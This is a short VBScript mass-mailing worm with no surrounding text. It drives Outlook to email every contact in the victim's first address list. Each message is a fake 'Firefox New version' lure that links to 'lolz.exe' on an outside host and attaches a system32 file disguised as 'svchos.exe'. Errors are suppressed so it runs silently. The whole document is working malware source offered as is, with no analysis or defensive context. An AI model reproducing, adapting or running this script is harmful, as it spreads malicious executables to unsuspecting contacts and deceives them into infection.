dim x 
on error resume next 
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.application") 
Set out=WScript.CreateObject("Outlook.application") 
Set mapi = out.GetNameSpace("mapi") 
Set a = mapi.addressLists(1) 
Set ae=a.addressEntries 
For x=1 To ae.Count 
Set ci=ol.CreateItem(0) 
Set Mail=ci 
mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
mail.Subject="Firefox New version" 
mail.Body="check that out new verison of firefox  http://npkforum.justfree.com/lolz.exe " 
mail.Attachments.Add("C:\WINDOWS\system32\svchos.exe") 
mail.send 
Next 
ol.Quit 
